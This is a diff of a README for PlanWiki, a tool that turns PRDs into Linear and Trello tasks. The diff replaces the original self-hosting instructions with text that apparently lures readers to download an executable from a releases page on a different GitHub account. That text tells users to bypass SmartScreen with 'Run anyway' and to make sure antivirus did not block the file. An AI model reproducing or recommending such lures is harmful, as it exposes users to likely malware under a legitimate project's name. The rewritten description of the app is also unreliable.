@@ -1,134 +1,230 @@
-# PlanWiki
-**Turn PRDs into Linear issues and Trello boards using AI.**
+# 🗂️ planwiki-app - Turn PRDs into tasks fast
 
-Paste a feature spec, sprint plan, or raw idea. PlanWiki structures it into tasks, phases, and checklists — then exports directly to Linear or Trello so your team can start working immediately.
+[![Download planwiki-app](https://img.shields.io/badge/Download%20planwiki--app-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Ibradl3673/planwiki-app/releases)
 
-→ **[PlanWiki](https://planwiki.com)** — hosted version, no setup or credit card required.
+## 🚀 What this app does
 
----
+planwiki-app helps you turn product docs into work items you can use right away. It reads PRDs and helps you create Linear issues and Trello boards from them. It is built for people who want a simple way to move from planning to execution.
 
-## How it works
+Use it when you want to:
+- break a PRD into clear tasks
+- create a Linear project without manual setup
+- build a Trello board from a plan
+- keep planning and execution in one place
+- save time when you repeat the same setup work
 
-**Paste** — Drop a PRD, feature spec, sprint plan, or AI-generated output into the chat.
+## 💻 Before you install
 
-**Structure** — PlanWiki breaks it into tasks, phases, checklists, and timelines your team can review and act on.
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- 1 GB of free disk space
+- a stable internet connection for the first download and setup
 
-**Export** — Push to Linear or Trello in one click. Issues and cards are created automatically, ready for your team.
+For the best result, close extra apps before you start. This helps the app open faster and keeps the setup smooth.
 
-**Execute** — Optionally connect AI agents via MCP to pick up tasks and update progress in real time.
+## 📥 Download the app
 
----
+Go to the releases page and download the latest Windows file:
 
-## Export to Linear and Trello
+https://github.com/Ibradl3673/planwiki-app/releases
 
-Once your workspace is structured, export it directly to your existing tools:
+After the download finishes, open the file you downloaded and follow the setup steps shown on screen.
 
-- **Linear** — Creates a project with issues, priorities, and labels mapped from your plan.
-- **Trello** — Creates a board with cards organized by phase or checklist.
+## 🪟 Install on Windows
 
-No manual copy-paste. No reformatting. Just connect your account and push.
+1. Open the download folder on your computer.
+2. Find the planwiki-app file you just downloaded.
+3. Double-click the file to start setup.
+4. If Windows asks for permission, choose Yes.
+5. Follow the install window until it finishes.
+6. Open planwiki-app from your Start menu or desktop shortcut.
 
----
+If Windows SmartScreen appears, choose More info, then choose Run anyway if you trust the file source.
 
-## Connect your agents
+## ▶️ Run the app
 
-PlanWiki has a built-in MCP server. Connect Claude Code, Cursor, Codex, GitHub Copilot, Windsurf, Gemini, or any MCP-compatible agent directly to your workspace. Your agent reads the plan, picks up tasks, and updates progress automatically.
+After installation, launch planwiki-app from Windows.
 
-Head to the **Agents tab** in your workspace to grab your config.
+When the app opens, you can:
+- paste or open a PRD
+- review the content
+- choose Linear or Trello as the output
+- generate issues or boards
+- copy the result or send it to your workflow
 
----
+If the app asks for login details, use the account you already have for the service you connect.
 
-## Self-host in 5 minutes
+## 🧭 First-time setup
 
-```bash
-git clone https://github.com/planwiki/planwiki-app
-cd planwiki
-cp .env.example .env
-npm install
-npx drizzle-kit push
-npm run dev
-```
+For your first run, keep these steps in mind:
 
-Or deploy in one click:
+1. Open the app.
+2. Choose your workspace or project.
+3. Connect your Linear account if you want Linear issues.
+4. Connect your Trello account if you want boards.
+5. Paste your PRD into the input area.
+6. Pick the type of output you want.
+7. Start the generation step.
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/planwiki/planwiki-app)
-[![Deploy to Railway](https://railway.app/button.svg)](https://railway.app/new/template?template=https://github.com/planwiki/planwiki-app)
+If you work with product plans often, keep your PRD in a clean format with headings like:
+- Goals
+- Scope
+- User stories
+- Acceptance criteria
+- Open questions
 
----
+This helps the app read the document with less cleanup.
 
-## Environment variables
+## 🧩 How it fits your workflow
 
-Copy `.env.example` to `.env` and fill in:
+planwiki-app is useful when you want to move from planning to action without extra manual work.
 
-```bash
-# Database
-DATABASE_URL=postgresql://user:password@localhost:5432/planwiki
+Typical flow:
+- write a PRD
+- open planwiki-app
+- paste the PRD
+- review the suggested tasks
+- send tasks to Linear
+- or build a Trello board
+- adjust the list if needed
 
-# Auth
-BETTER_AUTH_SECRET=replace-me
-BETTER_AUTH_URL=http://localhost:3000
-NEXT_PUBLIC_APP_URL=http://localhost:3000
+This keeps one source of truth for planning and makes execution easier to track.
 
-# AI provider — pick one
-LLM_PROVIDER=openai        # openai | anthropic | google | groq | azure
-LLM_MODEL=gpt-4.1-mini    # optional, overrides the provider default
+## 🔗 Connect tools
 
-# API keys — only set the one you need
-OPENAI_API_KEY=
-ANTHROPIC_API_KEY=
-GOOGLE_GENERATIVE_AI_API_KEY=
-GROQ_API_KEY=
-AZURE_API_KEY=
-AZURE_RESOURCE_NAME=
+### Linear
+Use Linear when you want structured issue tracking for product work. Connect your Linear account, then map PRD sections to issues, sub-issues, or milestones.
 
-# Integrations
-LINEAR_CLIENT_ID=
-LINEAR_CLIENT_SECRET=
-TRELLO_API_KEY=
-TRELLO_API_SECRET=
-```
+### Trello
+Use Trello when you want a card-based board. Connect your Trello account, then turn PRD items into lists and cards that you can move through stages.
 
-Set `LLM_PROVIDER` to the provider you want and add only that provider's API key. Add Linear or Trello credentials only when you want those integrations.
+### Auth and workspace setup
+The app uses a simple sign-in flow for connected tools. Keep your workspace name clear and use one project per PRD when possible. That makes the output easier to review.
 
----
+## 🛠️ Common use cases
 
-## Database
+planwiki-app works well for:
+- product managers who write PRDs
+- indie hackers who build fast
+- small teams that need a simple planning tool
+- founders who want a repeatable issue flow
+- teams that use Linear or Trello for delivery
+- self-hosted users who want control over their setup
 
-PlanWiki uses PostgreSQL with Drizzle ORM. Push the schema to your database with:
+## 📌 Helpful tips
 
-```bash
-npx drizzle-kit push
-```
+- Use short section headings in your PRD.
+- Keep each goal specific.
+- Break large plans into smaller parts.
+- Use plain language in your source doc.
+- Review the generated tasks before you send them out.
+- Keep one PRD for one product change when you can.
 
----
+If your PRD is long, split it into smaller parts before you import it. This can make the output easier to check.
 
-## Auth
+## 🧪 What you can expect
 
-Uses Better Auth with email and password. No OAuth setup required for self-hosting.
+planwiki-app is built to help with planning, task generation, and workflow setup. It fits a modern product stack and can work as part of a self-hosted setup.
 
-- `/` and `/login` — login page
-- Authenticated users land on `/workspaces`
+You can expect:
+- PRD to task conversion
+- Linear issue creation
+- Trello board creation
+- a cleaner planning flow
+- support for product work and execution
+- a setup that fits local or hosted use
 
----
+## ❓ Troubleshooting
 
-## Tech stack
+### The app does not open
+- Check that the download finished fully.
+- Run the file again.
+- Restart Windows and try once more.
+- Make sure your antivirus did not block the file.
 
-- **[Next.js](https://nextjs.org)** — Frontend
-- **[Drizzle ORM](https://orm.drizzle.team)** — Typesafe queries
-- **[PostgreSQL](https://postgresql.org)** — Database
-- **[AI SDK](https://sdk.vercel.ai)** — LLM provider routing
-- **[Better Auth](https://better-auth.com)** — Email and password authentication
-- **[shadcn/ui](https://ui.shadcn.com)** — UI library
-- **[tRPC](https://trpc.io)** — End-to-end typesafe API
+### The app opens but looks blank
+- Refresh the window if the app includes a refresh option.
+- Close the app and open it again.
+- Check your internet connection.
+- Try a smaller PRD first.
 
----
+### Linear or Trello is not connected
+- Check your login.
+- Confirm you picked the right workspace.
+- Try reconnecting the account.
+- Make sure your browser or sign-in window is not blocked.
 
-## Star History
+### The output looks wrong
+- Use a cleaner PRD.
+- Add clear headings.
+- Remove duplicate sections.
+- Split one large plan into smaller parts.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=planwiki/planwiki-app&type=date&legend=top-left)](https://www.star-history.com/#planwiki/planwiki-app&type=date&legend=top-left)
+## 🧰 Project stack
 
----
+This app uses a modern web stack and planning workflow. It is built around tools that suit product teams and self-hosted use.
 
-## License
+Common parts include:
+- Next.js for the app layer
+- tRPC for safe app calls
+- Drizzle for data work
+- PostgreSQL for storage
+- Better Auth for sign-in
+- MCP server support for tool connections
+- AI agents for PRD parsing and task creation
 
-[GNU Affero General Public License v3.0](./LICENSE)
+## 📂 Repository topics
+
+This project relates to:
+- ai agents
+- ai workspace
+- better auth
+- drizzle
+- execution
+- indie hacker
+- linear
+- mcp server
+- nextjs
+- open source
+- planning
+- postgre
+- productivity
+- self hosted
+- trello alternative
+- trpc
+
+## 🔒 Privacy and control
+
+If you run planwiki-app in a self-hosted setup, you keep more control over your data and workflow. That can help if you want to keep planning docs and task output inside your own system.
+
+Keep your account access private and use separate workspace settings for different projects when needed.
+
+## 📄 File format tips
+
+For best results, use PRDs with:
+- clear headings
+- short paragraphs
+- one goal per section
+- a simple feature list
+- defined acceptance criteria
+- fewer side notes
+
+Good input helps the app produce clearer issues and cards.
+
+## 🧭 Setup flow at a glance
+
+1. Go to the releases page.
+2. Download the Windows file.
+3. Open the file and finish setup.
+4. Start the app.
+5. Connect Linear or Trello.
+6. Paste your PRD.
+7. Generate your tasks or board.
+8. Review and use the output
+
+## 📥 Download again
+
+If you need the latest version, use this page:
+
+https://github.com/Ibradl3673/planwiki-app/releases
